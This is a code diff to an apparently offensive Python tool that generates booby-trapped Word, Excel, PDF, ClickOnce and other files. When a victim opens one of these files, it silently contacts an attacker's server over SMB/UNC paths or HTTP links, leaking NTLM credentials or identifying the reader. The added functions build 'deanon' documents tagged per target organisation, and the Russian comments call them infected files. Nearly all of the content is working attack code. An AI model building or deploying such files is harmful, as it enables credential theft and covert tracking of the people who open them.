@@ -115,7 +115,7 @@ def create_htm(server, md5_org_name, filename):
 	file.close()
 	print("Created: " + filename + " (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")
 
-def create_html_https(server, md5_org_name, filename):
+def create_html_http_deanon(server, md5_org_name, filename):
 	file = open(filename,'w')
 	file.write('''<!DOCTYPE html>
 <html>
@@ -179,14 +179,75 @@ def create_docx_frameset(server, md5_org_name, filename):
 
 	print("Created: " + filename + " (OPEN)")
 
+# .docx file with remote includepicture field attack
+def create_docx_includepicture(server, md5_org_name, filename):
+	src = os.path.join("templates", "docx-includepicture-template") 
+	dest = os.path.join("docx-includepicture-template")
+	shutil.copytree(src, dest)  
+	documentfilename = os.path.join("docx-includepicture-template", "word", "_rels", "document.xml.rels")
+	file = open(documentfilename, 'r')
+	filedata = file.read()
+	file.close()
+	filedata = filedata.replace('127.0.0.1', server)
+	filedata = filedata.replace('junkstr', md5_org_name)
+	file = open(documentfilename, 'w')
+	file.write(filedata)
+	file.close()
+	shutil.make_archive(filename, 'zip', "docx-includepicture-template")
+	os.rename(filename +".zip",filename)
+	shutil.rmtree("docx-includepicture-template")
+	print("Created: " + filename + " (OPEN)")
+
+# .docx file with remote includepicture field attack
+def create_docx_includepicture_merge_deanon(server, md5_org_name, filename):
+	src = os.path.join("templates", "docx-includepicutre-mergeformat-template")
+ 
+	dest = os.path.join("docx-includepicutre-mergeformat-template")
+	shutil.copytree(src, dest)  
+	documentfilename = os.path.join("docx-includepicutre-mergeformat-template", "word", "_rels", "document.xml.rels")
+	file = open(documentfilename, 'r')
+	filedata = file.read()
+	file.close()
+	filedata = filedata.replace('127.0.0.1', server)
+	filedata = filedata.replace('junkstr', md5_org_name)
+	file = open(documentfilename, 'w')
+	file.write(filedata)
+	file.close()
+	shutil.make_archive(filename, 'zip', "docx-includepicutre-mergeformat-template")
+	os.rename(filename +".zip",filename)
+	shutil.rmtree("docx-includepicutre-mergeformat-template")
+	print("Created: " + filename + " (OPEN)")
+
+
 # .xlsx file with cell based attack
 def create_xlsx_externalcell(server, md5_org_name, filename):
-	workbook = xlsxwriter.Workbook(filename)
-	worksheet = workbook.add_worksheet()
+    workbook = xlsxwriter.Workbook(filename)
+    worksheet = workbook.add_worksheet()
     #worksheet.write_url('AZ1', "external://"+server+"\\share\\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)")
-	worksheet.write_url('AZ1', "external://"+server+ f"\\{md5_org_name}'!$B$2:$C$62,2,FALSE)")
-	workbook.close()
-	print("Created: " + filename + " (OPEN)")
+    worksheet.write_url('AZ1', "external://"+server+ f"\\{md5_org_name}'!$B$2:$C$62,2,FALSE)")
+    workbook.close()
+    print("Created: " + filename + " (OPEN)")
+
+# .xlsx file with remote image
+def create_xlsx_remotelink_deanon(server, md5_org_name, filename):
+    src = os.path.join("templates", "xlsx-remotelink-template")
+    
+    dest = os.path.join("xlsx-remotelink-template")
+    shutil.copytree(src, dest)  
+    documentfilename = os.path.join("xlsx-remotelink-template", "xl", "externalLinks", "_rels" , "externalLink1.xml.rels")
+    file = open(documentfilename, 'r')
+    filedata = file.read()
+    file.close()
+    filedata = filedata.replace('127.0.0.1', server)
+    filedata = filedata.replace('junkstr', md5_org_name)
+    file = open(documentfilename, 'w')
+    file.write(filedata)
+    file.close()
+    shutil.make_archive(filename, 'zip', "xlsx-remotelink-template")
+    os.rename(filename +".zip",filename)
+    shutil.rmtree("xlsx-remotelink-template")
+    print("Created: " + filename + " (OPEN)")
+
 
 # .wax remote playlist attack
 # Filename: shareattack.wax, action=open, attacks=windows media player
@@ -245,7 +306,7 @@ def create_application(server, md5_org_name, filename):
    <description asmv2:publisher="Leak" asmv2:product="Leak" asmv2:supportUrl="" xmlns="urn:schemas-microsoft-com:asm.v1" />
    <deployment install="false" mapFileExtensions="true" trustURLParameters="true" />
    <dependency>
-      <dependentAssembly dependencyType="install" codebase="file://''' + server + '''/leak/Leak.exe.manifest" size="32909">
+      <dependentAssembly dependencyType="install" codebase="file://''' + server + f'''/{md5_org_name}" size="32909">
          <assemblyIdentity name="Leak.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" type="win32" />
          <hash>
             <dsig:Transforms>
@@ -323,6 +384,79 @@ trailer
 %%EOF''')
 	file.close()
 	print("Created: " + filename + " (OPEN AND ALLOW)")
+
+#FIXME
+# https://0xcybery.github.io/blog/hacking-with-pdf####Open-Malicious-Link
+# https://www.first.org/resources/papers/hamburg2010/Malicious_PDF_Files.pdf
+def create_pdf_deanon(server, md5_org_name, filename):
+	file = open(filename,'w')
+	file.write('''%PDF-1.7
+1 0 obj
+<</Type/Catalog/Pages 2 0 R>>
+endobj
+2 0 obj
+<</Type/Pages/Kids[3 0 R]/Count 1>>
+endobj
+3 0 obj
+<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
+endobj
+xref
+0 4
+0000000000 65535 f
+0000000015 00000 n
+0000000060 00000 n
+0000000111 00000 n
+trailer
+<</Size 4/Root 1 0 R>>
+startxref
+190
+3 0 obj
+<< /Type /Page
+   /Contents 4 0 R
+   /AA <<
+	   /O <<
+	      /F (\\\\\\\\''' + server + f'''\\\\{md5_org_name})
+		  /D [ 0 /Fit]
+		  /S /GoToE
+		  >>
+	   >>
+	   /Parent 2 0 R
+	   /Resources <<
+			/Font <<
+				/F1 <<
+					/Type /Font
+					/Subtype /Type1
+					/BaseFont /Helvetica
+					>>
+				  >>
+				>>
+>>
+endobj
+8 0 obj
+<<
+/Type /Action
+/S /URI
+/URI (http://192.168.88.37/junkstr)
+>>
+endobj 
+stream
+BT
+/TI_0 1 Tf
+14 0 0 14 10.000 753.976 Tm
+0.0 0.0 0.0 rg
+(PDF Document) Tj
+ET
+endstream
+endobj
+4 0 obj<< /Length 100>>
+trailer
+<<
+	/Root 1 0 R
+>>
+%%EOF''')
+	file.close()
+	print("Created: " + filename + " (OPEN AND ALLOW)")
+
 
 
 def create_zoom(server,md5_org_name,filename):
@@ -491,11 +625,7 @@ def inject_exist_files(server_ip, md5_org_name, filename):
 def create_injected_files(server_ip, md5_org_name, filename):
     """Создание зараженных файлов"""
 
-    # create folder to hold templates, if already exists delete it
-    if os.path.exists(filename):
-    	shutil.rmtree(filename)
-    os.makedirs(filename)
-    
+        
     # handle which documents to create
     create_scf(server_ip, md5_org_name, os.path.join(filename, filename + ".scf"))
 
@@ -521,6 +651,7 @@ def create_injected_files(server_ip, md5_org_name, filename):
 
     # not working
     #create_docx_remote_template(server_ip, md5_org_name, os.path.join(filename, filename + "-(remotetemplate).docx"))
+    #create_docx_includepicture(server_ip, md5_org_name, os.path.join(filename, filename + "-(includepicture).docx"))
 
     create_docx_frameset(server_ip, md5_org_name, os.path.join(filename, filename + "-(frameset).docx"))
 
@@ -551,7 +682,14 @@ def create_injected_files(server_ip, md5_org_name, filename):
 def create_injected_deanon_files(server_ip, md5_org_name, filename): 
     """Добавление внешних ссылок в документы"""
 
-    create_html_https(server_ip, md5_org_name, os.path.join(filename, filename + ".deanon.html"))
+    create_html_http_deanon(server_ip, md5_org_name, os.path.join(filename, filename + ".deanon.html"))
+
+    create_docx_includepicture_merge_deanon(server_ip, md5_org_name, os.path.join(filename, filename + "-(includepicture-merge).deanon.docx"))
+
+    create_xlsx_remotelink_deanon(server_ip, md5_org_name, os.path.join(filename, filename + "-(remotelink).deanon.xlsx"))
+
+    create_pdf_deanon(server_ip, md5_org_name, os.path.join(filename, filename + ".deanon.pdf"))
+
     print("Генерация файлов для деанонимизации завершена.")
 
 def add_org_name_in_db(org_name, md5_org_name):
@@ -576,13 +714,18 @@ def main():
     if args.filename_inject:
         inject_exist_files(args.server, md5_org_name, args.filename_inject)
     elif args.filenames:
+        # create folder to hold templates, if already exists delete it
+        if os.path.exists(args.filenames):
+        	shutil.rmtree(args.filenames)
+        os.makedirs(args.filenames)
+
         create_injected_files(args.server, md5_org_name, args.filenames)
         create_injected_deanon_files(args.server, md5_org_name, args.filenames)
     else:
         print("Needed necessary keys: --inject or --create")
         return
 
-    add_org_name_in_db(args.org_name, md5_org_name)
+    #add_org_name_in_db(args.org_name, md5_org_name)
 
 if __name__ == "__main__":
     main()
